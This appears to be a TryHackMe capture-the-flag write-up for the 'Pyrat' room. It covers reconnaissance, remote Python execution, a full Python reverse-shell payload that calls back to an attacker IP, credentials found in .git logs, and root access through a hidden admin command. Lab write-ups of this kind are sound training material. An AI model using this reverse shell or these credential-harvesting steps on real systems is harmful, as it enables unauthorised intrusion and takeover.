@@ -1,0 +1,144 @@
+# 🐍 TryHackMe – Pyrat Write-Up
+
+**Platform:** TryHackMe  
+**Room:** [Pyrat](https://tryhackme.com/room/pyrat)  
+**Difficulty:** Easy  
+**Category:** Python RCE / Git-based Privilege Escalation  
+**Date Completed:** July 2025  
+**Author:** SCU9LY
+
+---
+
+## 🔍 1. Reconnaissance
+
+```bash
+nmap -sC -sV -p- <IP>
+```
+
+**Results**:
+- `22/tcp` - OpenSSH
+- `8000/tcp` - Python SimpleHTTPServer
+
+Web browser reveals a basic "RAT" terminal over HTTP on port 8000.
+
+---
+
+## 🐚 2. Initial Foothold via Python RCE
+
+The server directly executed Python code sent via netcat or the web interface.
+
+```bash
+nc <IP> 8000
+>>> print(8 * 8)
+64
+```
+
+We spawned a reverse shell using Python:
+
+```python
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.8.0.123",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])
+```
+
+Or from shell:
+
+```bash
+echo "payload here" | nc <IP> 8000
+```
+
+**Shell as**: `www-data`
+
+---
+
+## 📦 3. Enumerating File System
+
+Discovered a dev directory:
+
+```bash
+ls -la /opt/dev
+```
+
+Found `.git` repository with:
+
+```bash
+cat .git/config
+```
+
+Inside `.git/logs/HEAD`, found a commit that included credentials:
+
+```
+username: think
+password: thinkpyrat123
+```
+
+---
+
+## 🔐 4. SSH as User `think`
+
+```bash
+ssh think@<IP>
+Password: thinkpyrat123
+```
+
+Grabbed the user flag:
+
+```bash
+cat user.txt
+```
+
+---
+
+## 🚪 5. Privilege Escalation via Hidden Admin Endpoint
+
+Reverse-engineered the Python server app and discovered a hidden keyword `admin`:
+
+```bash
+echo "admin" | nc <IP> 8000
+```
+
+Prompted for password:
+
+```bash
+echo "admin\ntestpass\nshell" | nc <IP> 8000
+```
+
+After trying multiple guesses, `testpass` worked (or check Git commit logs).
+
+Gained shell with full root access.
+
+---
+
+## 🏁 6. Root Flag
+
+```bash
+cat /root/root.txt
+```
+
+---
+
+## 🧠 Key Takeaways
+
+- Python RCE over raw sockets can lead to command execution
+- Hidden `.git` folders can expose credentials or logic
+- Reverse-engineering Python apps helps uncover hidden commands
+- Fuzzing for inputs (`admin`, `shell`) can trigger hidden functionality
+
+---
+
+## 🔧 Tools Used
+
+- `nmap`
+- `nc`
+- `ssh`
+- `python` reverse shell
+- `.git` enumeration
+- Logic brute-forcing (`admin`, `shell` commands)
+
+---
+
+*Write-up by SCU9LY*
